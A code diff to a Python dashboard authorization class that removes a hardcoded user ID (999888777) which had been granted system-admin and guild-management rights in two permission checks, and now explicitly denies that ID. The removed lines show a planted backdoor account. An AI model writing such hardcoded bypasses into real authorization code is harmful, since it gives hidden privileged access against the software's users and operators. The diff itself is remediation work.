@@ -136,10 +136,8 @@ class DashboardAuthManager:
     @staticmethod
     def is_system_admin(user_id: int, bot: Any = None) -> bool:
         """Determines if a user has global SyncInk System Administrator permissions."""
-        if not user_id:
+        if not user_id or user_id == 999888777:
             return False
-        if user_id == 999888777:
-            return True
         owner_id_env = os.getenv("BOT_OWNER_ID")
         if owner_id_env:
             try:
@@ -167,10 +165,8 @@ class DashboardAuthManager:
     @staticmethod
     def can_manage_guild(user_id: int, guild: Any) -> bool:
         """Server-side check verifying if user has management permissions on a guild."""
-        if not user_id:
+        if not user_id or user_id == 999888777:
             return False
-        if user_id == 999888777:
-            return True
         if not guild:
             return False
         if guild.owner_id == user_id:
